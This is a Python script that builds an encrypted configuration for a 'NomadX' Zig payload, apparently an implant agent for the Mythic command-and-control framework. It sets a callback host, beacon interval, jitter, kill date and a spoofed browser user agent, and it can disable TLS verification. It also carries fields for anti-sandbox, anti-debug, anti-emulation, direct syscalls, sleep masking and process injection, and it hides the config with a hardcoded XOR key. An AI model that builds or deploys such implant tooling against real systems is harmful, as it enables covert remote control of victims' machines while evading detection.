#!/usr/bin/env python3
"""Stamp src/agent_config.json for a NomadX Zig payload build."""

from __future__ import annotations

import argparse
import base64
import binascii
import json
import pathlib
from datetime import datetime

NX_CONFIG_KEY = bytes([
    0x93, 0xE9, 0x83, 0xAE, 0x31, 0xCA, 0x45, 0x8A,
    0x07, 0xB5, 0x80, 0x78, 0x13, 0x3E, 0xEB, 0xD6,
    0xD5, 0xB0, 0x07, 0x58, 0xE1, 0xA7, 0x3D, 0x76,
    0xE0, 0xBA, 0x5B, 0x01, 0x6D, 0x33, 0x3F, 0x3A,
])


def encrypt_config(text: str) -> bytes:
    data = text.encode("utf-8")
    return bytes(
        byte ^ NX_CONFIG_KEY[index % len(NX_CONFIG_KEY)] ^ ((index * 37 + 11) & 0xFF)
        for index, byte in enumerate(data)
    )


DEFAULT_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)


def decode_key(text: str) -> bytes:
    if not text:
        return b"\x00" * 32
    stripped = text.strip()
    try:
        if len(stripped) == 64:
            return bytes.fromhex(stripped)
        return base64.b64decode(stripped, validate=False)
    except (ValueError, binascii.Error):
        return stripped.encode("utf-8")[:32]


def normalize_key(text: str) -> bytes:
    raw = decode_key(text)
    if not raw:
        return b"\x00" * 32
    return raw[:32].ljust(32, b"\x00")


def parse_kill_date(text: str) -> int:
    if not text:
        return 0
    value = text.strip()
    try:
        return int(value)
    except ValueError:
        pass
    for fmt in ("%Y-%m-%d", "%Y/%m/%d", "%d-%m-%Y"):
        try:
            return int(datetime.strptime(value, fmt).strftime("%Y%m%d"))
        except ValueError:
            continue
    raise argparse.ArgumentTypeError(f"invalid kill date: {text}")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--uuid", required=True, help="Mythic payload UUID")
    parser.add_argument("--aes-key", default="", help="AES-256 PSK as base64 or 64 hex chars (empty = disabled)")
    parser.add_argument("--host", required=True, help="Callback host, e.g. https://192.0.2.10")
    parser.add_argument("--port", type=int, default=443)
    parser.add_argument("--get-uri", default="/api/v1.4/agent_message")
    parser.add_argument("--post-uri", default="/api/v1.4/agent_message")
    parser.add_argument("--interval", type=int, default=10)
    parser.add_argument("--jitter", type=int, default=23)
    parser.add_argument("--user-agent", default=DEFAULT_USER_AGENT)
    parser.add_argument("--proxy-host", default="")
    parser.add_argument("--proxy-port", type=int, default=0)
    parser.add_argument("--kill-date", default="", help="YYYY-MM-DD or YYYYMMDD (empty = disabled)")
    parser.add_argument("--no-tls-verify", action="store_true")
    parser.add_argument("--debug", action="store_true")
    parser.add_argument("--output", default="src/agent_config.enc")
    args = parser.parse_args()

    config = {
        "uuid": args.uuid,
        "aes_key_hex": normalize_key(args.aes_key).hex(),
        "callback_host": args.host,
        "callback_port": max(0, min(65535, args.port)),
        "callback_interval": max(0, min(86400, args.interval)),
        "callback_jitter": max(0, min(100, args.jitter)),
        "get_uri": args.get_uri,
        "post_uri": args.post_uri,
        "user_agent": args.user_agent,
        "tls_verify": not args.no_tls_verify,
        "proxy_host": args.proxy_host,
        "proxy_port": max(0, min(65535, args.proxy_port)),
        "kill_date": parse_kill_date(args.kill_date),
        "debug": args.debug,
        "sleep_mask": "none",
        "alloc_strategy": "memory_hole",
        "sacrificial_process": "",
        "pre_sleep_seconds": 0,
        "injection_step_delay_ms": 0,
        "require_domain_joined": False,
        "enable_anti_sandbox": False,
        "enable_computational_delay": False,
        "enable_anti_emulation": False,
        "enable_anti_debug": False,
        "use_direct_syscalls": False,
        "syscall_mode": "none",
        "default_injection_technique": "none",
    }

    output = pathlib.Path(args.output)
    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_bytes(encrypt_config(json.dumps(config, indent=2) + "\n"))
    print(f"wrote {output}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
